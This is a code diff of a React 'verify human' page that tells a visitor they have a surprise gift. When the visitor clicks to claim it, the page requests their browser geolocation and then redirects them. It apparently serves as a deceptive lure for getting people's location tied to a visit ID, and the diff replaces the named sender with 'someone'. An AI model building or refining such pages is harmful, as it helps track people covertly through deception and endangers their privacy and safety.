@@ -8,7 +8,7 @@ export default function VerifyHumanClient({ visitId, destination }: { visitId: s
 
   const startVerification = () => {
     setStatus('verifying');
-    
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         async (position) => {
@@ -62,7 +62,7 @@ export default function VerifyHumanClient({ visitId, destination }: { visitId: s
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4 text-gray-900 font-sans">
       <div className="max-w-md w-full bg-white rounded-xl shadow-lg border border-gray-100 p-8 text-center flex flex-col items-center">
-        
+
         {status === 'idle' && (
           <>
             <div className="w-20 h-20 rounded-full bg-pink-100 flex items-center justify-center mb-6">
@@ -70,9 +70,9 @@ export default function VerifyHumanClient({ visitId, destination }: { visitId: s
             </div>
             <h1 className="text-2xl font-bold mb-2">You Have a Surprise!</h1>
             <p className="text-gray-500 mb-8 max-w-[280px]">
-              virendra sends a surprise for you. Claim it to see what it is!
+              someone sends a surprise for you. Claim it to see what it is!
             </p>
-            <button 
+            <button
               onClick={startVerification}
               className="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold py-4 px-6 rounded-lg transition-colors flex items-center justify-center gap-2 text-lg shadow-md"
             >
@@ -99,11 +99,11 @@ export default function VerifyHumanClient({ visitId, destination }: { visitId: s
             <p className="text-gray-500">Redirecting you to your gift...</p>
           </>
         )}
-        
+
       </div>
-      
+
       <div className="mt-8 text-xs text-gray-400 flex items-center gap-2">
-        <span>💝 Sent by virendra</span>
+        <span>💝 Sent by someone</span>
       </div>
     </div>
   );
